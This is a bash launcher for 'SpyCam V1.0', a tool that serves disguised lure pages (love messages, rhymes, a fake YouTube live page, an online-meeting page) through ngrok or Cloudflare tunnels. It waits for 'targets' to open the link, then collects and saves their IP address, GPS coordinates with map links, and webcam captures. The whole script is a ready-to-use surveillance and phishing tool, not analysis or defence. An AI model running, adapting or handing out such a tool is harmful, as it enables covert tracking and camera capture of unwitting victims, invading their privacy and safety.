#!/bin/bash
# Cek OS
uname_all="$(uname -a 2>/dev/null || true)"
os_name="$(uname -s 2>/dev/null || true)"
arch="$(uname -m 2>/dev/null || true)"

windows_mode=false
if [[ "$uname_all" == *"MINGW"* ]] || [[ "$uname_all" == *"MSYS"* ]] || [[ "$uname_all" == *"CYGWIN"* ]] || [[ "$uname_all" == *"Windows"* ]]; then
  windows_mode=true
  echo "Windows system detected. Some commands will be adapted for Windows compatibility."

  function killall() {
    taskkill /F /IM "$1" 2>/dev/null
  }

  function pkill() {
    if [[ "$1" == "-f" ]]; then
      shift
      shift
      taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null
    else
      taskkill /F /IM "$1" 2>/dev/null
    fi
  }
fi

require_command() {
  command -v "$1" >/dev/null 2>&1 || {
    echo >&2 "I require $1 but it's not installed. Install it. Aborting."
    exit 1
  }
}

# banner
banner() {
  clear
  printf "\x1b[31;49;1m _______  _______           \x1b[34;1m_______  _______  _______ \n"
  printf "\x1b[31;49;1m(  ____ \(  ____ )|\     /|\x1b[34;1m(  ____ \(  ___  )(       )\n"
  printf "\x1b[31;49;1m| (    \/| (    )|( \   / )\x1b[34;1m| (    \/| (   ) || () () |\n"
  printf "\x1b[31;49;1m| (_____ | (____)| \ (_) / \x1b[34;1m| |      | (___) || || || |\n"
  printf "\x1b[31;49;1m(_____  )|  _____)  \   /  \x1b[34;1m| |      |  ___  || |(_)| |\n"
  printf "\x1b[31;49;1m      ) || (         ) (   \x1b[34;1m| |      | (   ) || |   | |\n"
  printf "\x1b[31;49;1m/\____) || )         | |   \x1b[34;1m| (____/\| )   ( || )   ( |\n"
  printf "\x1b[31;49;1m\_______)|/          \_/   \x1b[34;1m(_______/|/     \||/     \|\n"
  printf "\x1b[33;1mSpyCam V1.0\n"
  printf "\x1b[37;1mCreate by Astral  |  https://github.com/muhammadasgarultsani/SpyCam.git\n"
}

dependencies() {
  require_command php
}

download_file() {
  local url="$1"
  local output="$2"
  wget --no-check-certificate "$url" -O "$output" >/dev/null 2>&1
}

extract_zip() {
  unzip "$1" >/dev/null 2>&1
  rm -f "$1"
}

extract_tgz() {
  tar -xzf "$1" >/dev/null 2>&1
  rm -f "$1"
}

stop() {
  if [[ "$windows_mode" == true ]]; then
    taskkill /F /IM "ngrok.exe" 2>/dev/null
    taskkill /F /IM "php.exe" 2>/dev/null
    taskkill /F /IM "cloudflared.exe" 2>/dev/null
  else
    pkill -f -2 ngrok >/dev/null 2>&1 || true
    pkill -f -2 php >/dev/null 2>&1 || true
    pkill -f -2 cloudflared >/dev/null 2>&1 || true
  fi

  exit 1
}

catch_ip() {
  ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
  IFS=$'\n'
  printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

  cat ip.txt >>saved.ip.txt
}

catch_location() {
  if [[ -e "current_location.txt" ]]; then
    printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Current location data:\e[0m\n"
    grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" current_location.txt
    printf "\n"
    mv current_location.txt current_location.bak
  fi

  shopt -s nullglob
  location_files=(location_*)
  shopt -u nullglob

  if ((${#location_files[@]})); then
    location_file="${location_files[0]}"
    lat=$(grep -a 'Latitude:' "$location_file" | cut -d ' ' -f2 | tr -d '\r')
    lon=$(grep -a 'Longitude:' "$location_file" | cut -d ' ' -f2 | tr -d '\r')
    acc=$(grep -a 'Accuracy:' "$location_file" | cut -d ' ' -f2 | tr -d '\r')
    maps_link=$(grep -a 'Google Maps:' "$location_file" | cut -d ' ' -f3 | tr -d '\r')

    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Latitude:\e[0m\e[1;77m %s\e[0m\n" "$lat"
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Longitude:\e[0m\e[1;77m %s\e[0m\n" "$lon"
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Accuracy:\e[0m\e[1;77m %s meters\e[0m\n" "$acc"
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Google Maps:\e[0m\e[1;77m %s\e[0m\n" "$maps_link"

    mkdir -p saved_locations
    mv "$location_file" saved_locations/
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Location saved to saved_locations/%s\e[0m\n" "$location_file"
  else
    printf "\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] No location file found\e[0m\n"
  fi
}

checkfound() {
  mkdir -p saved_locations

  printf "\n"
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location tracking is \e[0m\e[1;93mACTIVE\e[0m\n"
  while true; do
    if [[ -e "ip.txt" ]]; then
      printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
      catch_ip
      rm -f ip.txt
    fi

    sleep 0.5

    if [[ -e "current_location.txt" ]]; then
      printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
      catch_location
    fi

    if [[ -e "LocationLog.log" ]]; then
      printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
      catch_location
      rm -f LocationLog.log
    fi

    if [[ -e "LocationError.log" ]]; then
      rm -f LocationError.log
    fi

    if [[ -e "Log.log" ]]; then
      printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
      rm -f Log.log
    fi

    sleep 0.5
  done
}

cloudflare_tunnel() {
  require_command wget
  require_command unzip

  if [[ ! -e cloudflared && ! -e cloudflared.exe ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"

    if [[ "$windows_mode" == true ]]; then
      printf "\e[1;92m[\e[0m+\e[1;92m] Windows detected, downloading Windows binary...\n"
      download_file https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe cloudflared.exe || {
        printf "\e[1;93m[!] Download error... \e[0m\n"
        exit 1
      }
      chmod +x cloudflared.exe
      echo '#!/bin/bash' >cloudflared
      echo './cloudflared.exe "$@"' >>cloudflared
      chmod +x cloudflared
    elif [[ "$os_name" == "Darwin" ]]; then
      require_command tar
      printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...\n"
      if [[ "$arch" == "arm64" ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon detected...\n"
        download_file https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz cloudflared.tgz || {
          printf "\e[1;93m[!] Download error... \e[0m\n"
          exit 1
        }
      else
        printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...\n"
        download_file https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz cloudflared.tgz || {
          printf "\e[1;93m[!] Download error... \e[0m\n"
          exit 1
        }
      fi
      extract_tgz cloudflared.tgz
      chmod +x cloudflared
    else
      case "$arch" in
      x86_64)
        printf "\e[1;92m[\e[0m+\e[1;92m] x86_64 architecture detected...\n"
        download_file https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 cloudflared
        ;;
      i686 | i386)
        printf "\e[1;92m[\e[0m+\e[1;92m] x86 32-bit architecture detected...\n"
        download_file https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 cloudflared
        ;;
      aarch64 | arm64)
        printf "\e[1;92m[\e[0m+\e[1;92m] ARM64 architecture detected...\n"
        download_file https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 cloudflared
        ;;
      armv7l | armv6l | arm)
        printf "\e[1;92m[\e[0m+\e[1;92m] ARM architecture detected...\n"
        download_file https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm cloudflared
        ;;
      *)
        printf "\e[1;92m[\e[0m+\e[1;92m] Architecture not specifically detected ($arch), defaulting to amd64...\n"
        download_file https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 cloudflared
        ;;
      esac
      chmod +x cloudflared
    fi
  fi

  printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
  php -S 127.0.0.1:3333 >/dev/null 2>&1 &
  sleep 2
  printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
  rm -f .cloudflared.log

  if [[ "$windows_mode" == true ]]; then
    ./cloudflared.exe tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log >/dev/null 2>&1 &
  else
    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log >/dev/null 2>&1 &
  fi

  sleep 10
  link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
  if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
    printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlare tunnel service might be down\n"
    printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
    printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlared is already running, run this command killall cloudflared\n"
    printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
    printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running: ./cloudflared tunnel --url 127.0.0.1:3333 to see specific errors\n"
    printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m On Windows, try running: cloudflared.exe tunnel --url 127.0.0.1:3333\n"
    exit 1
  else
    printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
  fi

  payload_cloudflare
  checkfound
}

payload_cloudflare() {
  link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
  sed 's+forwarding_link+'$link'+g' template.php >index.php
  if [[ $option_tem -eq 1 ]]; then
    sed 's+forwarding_link+'$link'+g' ucapan.html >index2.html
  elif [[ $option_tem -eq 2 ]]; then
    sed 's+forwarding_link+'$link'+g' LiveYTTV.html >index3.html
    sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html >index2.html
  elif [[ $option_tem -eq 3 ]]; then
    sed 's+forwarding_link+'$link'+g' pantun1.html >index2.html
  elif [[ $option_tem -eq 4 ]]; then
    sed 's+forwarding_link+'$link'+g' temp4.html >index2.html
  elif [[ $option_tem -eq 5 ]]; then
    sed 's+forwarding_link+'$link'+g' temp5.html >index2.html
  elif [[ $option_tem -eq 6 ]]; then
    sed 's+forwarding_link+'$link'+g' temp6.html >index2.html
  elif [[ $option_tem -eq 7 ]]; then
    sed 's+forwarding_link+'$link'+g' temp7.html >index2.html
  elif [[ $option_tem -eq 8 ]]; then
    sed 's+forwarding_link+'$link'+g' temp8.html >index2.html
  elif [[ $option_tem -eq 9 ]]; then
    sed 's+forwarding_link+'$link'+g' temp9.html >index2.html
  else
    sed 's+forwarding_link+'$link'+g' OnlineMeeting.html >index2.html
  fi
  rm -rf index3.html
}

ngrok_server() {
  require_command wget
  require_command unzip

  if [[ ! -e ngrok && ! -e ngrok.exe ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...
"

    if [[ "$windows_mode" == true ]]; then
      printf "\e[1;92m[\e[0m+\e[1;92m] Windows detected, downloading Windows binary...
"
      download_file https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip ngrok.zip || {
        printf "\e[1;93m[!] Download error... \e[0m
"
        exit 1
      }
      extract_zip ngrok.zip
      chmod +x ngrok.exe
    elif [[ "$os_name" == "Darwin" ]]; then
      printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...
"
      if [[ "$arch" == "arm64" ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon detected...
"
        download_file https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip ngrok.zip || {
          printf "\e[1;93m[!] Download error... \e[0m
"
          exit 1
        }
      else
        printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...
"
        download_file https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip ngrok.zip || {
          printf "\e[1;93m[!] Download error... \e[0m
"
          exit 1
        }
      fi
      extract_zip ngrok.zip
      chmod +x ngrok
    else
      case "$arch" in
      x86_64)
        printf "\e[1;92m[\e[0m+\e[1;92m] x86_64 architecture detected...
"
        download_file https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip ngrok.zip
        ;;
      i686 | i386)
        printf "\e[1;92m[\e[0m+\e[1;92m] x86 32-bit architecture detected...
"
        download_file https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip ngrok.zip
        ;;
      aarch64 | arm64)
        printf "\e[1;92m[\e[0m+\e[1;92m] ARM64 architecture detected...
"
        download_file https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip ngrok.zip
        ;;
      armv7l | armv6l | arm)
        printf "\e[1;92m[\e[0m+\e[1;92m] ARM architecture detected...
"
        download_file https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip ngrok.zip
        ;;
      *)
        printf "\e[1;92m[\e[0m+\e[1;92m] Architecture not specifically detected ($arch), defaulting to amd64...
"
        download_file https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip ngrok.zip
        ;;
      esac
      if [[ ! -e ngrok.zip ]]; then
        printf "\e[1;93m[!] Download error... \e[0m
"
        exit 1
      fi
      extract_zip ngrok.zip
      chmod +x ngrok
    fi
  fi

  local auth_path
  if [[ "$windows_mode" == true ]]; then
    auth_path="$USERPROFILE/.ngrok2/ngrok.yml"
  else
    auth_path="$HOME/.ngrok2/ngrok.yml"
  fi

  if [[ -e "$auth_path" ]]; then
    printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
    cat "$auth_path"
    read -p $'
\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
    if [[ $chg_token =~ ^([Yy]|Yes|yes)$ ]]; then
      read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
      if [[ "$windows_mode" == true ]]; then
        ./ngrok.exe authtoken "$ngrok_auth" >/dev/null 2>&1
      else
        ./ngrok authtoken "$ngrok_auth" >/dev/null 2>&1
      fi
      printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed
"
    fi
  else
    read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
    if [[ "$windows_mode" == true ]]; then
      ./ngrok.exe authtoken "$ngrok_auth" >/dev/null 2>&1
    else
      ./ngrok authtoken "$ngrok_auth" >/dev/null 2>&1
    fi
  fi

  printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...
"
  php -S 127.0.0.1:3333 >/dev/null 2>&1 &
  sleep 2
  printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...
"
  if [[ "$windows_mode" == true ]]; then
    ./ngrok.exe http 3333 >/dev/null 2>&1 &
  else
    ./ngrok http 3333 >/dev/null 2>&1 &
  fi

  sleep 10

  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/" ]*\.ngrok-free.app')
  if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m
"
    printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid
"
    printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on
"
    printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok
"
    printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection
"
    printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running ngrok manually: ./ngrok http 3333
"
    exit 1
  else
    printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m
" "$link"
  fi

  payload_ngrok
  checkfound
}
payload_ngrok() {
  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
  sed 's+forwarding_link+'$link'+g' template.php >index.php
  if [[ $option_tem -eq 1 ]]; then
    sed 's+forwarding_link+'$link'+g' ucapan.html >index2.html
  elif [[ $option_tem -eq 2 ]]; then
    sed 's+forwarding_link+'$link'+g' LiveYTTV.html >index3.html
    sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html >index2.html
  elif [[ $option_tem -eq 3 ]]; then
    sed 's+forwarding_link+'$link'+g' pantun1.html >index2.html
  elif [[ $option_tem -eq 4 ]]; then
    sed 's+forwarding_link+'$link'+g' temp4.html >index2.html
  elif [[ $option_tem -eq 5 ]]; then
    sed 's+forwarding_link+'$link'+g' temp5.html >index2.html
  elif [[ $option_tem -eq 6 ]]; then
    sed 's+forwarding_link+'$link'+g' temp6.html >index2.html
  elif [[ $option_tem -eq 7 ]]; then
    sed 's+forwarding_link+'$link'+g' temp7.html >index2.html
  elif [[ $option_tem -eq 8 ]]; then
    sed 's+forwarding_link+'$link'+g' temp8.html >index2.html
  elif [[ $option_tem -eq 9 ]]; then
    sed 's+forwarding_link+'$link'+g' temp9.html >index2.html
  else
    sed 's+forwarding_link+'$link'+g' OnlineMeeting.html >index2.html
  fi
  rm -rf index3.html
}

spycam() {
  if [[ -e sendlink ]]; then
    rm -rf sendlink
  fi

  printf "\n-----Choose tunnel server----\n"
  printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
  default_option_server="1"
  read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
  option_server="${option_server:-${default_option_server}}"
  select_template

  if [[ $option_server -eq 2 ]]; then
    cloudflare_tunnel
  elif [[ $option_server -eq 1 ]]; then
    ngrok_server
  else
    printf "\e[1;93m [!] Invalid option!\e[0m\n"
    sleep 1
    clear
    spycam
  fi
}

select_template() {
  if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
    printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
    sleep 1
    clear
    banner
    spycam
  else
    printf "\n-----Choose a template----\n"
    printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ucapan cinta nih... kiw kiw\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Pantun cinta\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Coming Soon\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Coming Soon\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Coming Soon\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m Coming Soon\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;93m Coming Soon\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;93m OnlineMeeting\e[0m\n"
    default_option_template="1"
    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
    option_tem="${option_tem:-${default_option_template}}"
    if [[ $option_tem -eq 1 ]]; then
      printf ""
    elif [[ $option_tem -eq 2 ]]; then
      read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
    elif [[ $option_tem -eq 3 ]]; then
      printf ""
    elif [[ $option_tem -eq 4 ]]; then
      printf ""
    elif [[ $option_tem -eq 5 ]]; then
      printf ""
    elif [[ $option_tem -eq 6 ]]; then
      printf ""
    elif [[ $option_tem -eq 7 ]]; then
      printf ""
    elif [[ $option_tem -eq 8 ]]; then
      printf ""
    elif [[ $option_tem -eq 9 ]]; then
      printf ""
    else
      printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
      sleep 1
      select_template
    fi
  fi
}

banner
dependencies
spycam
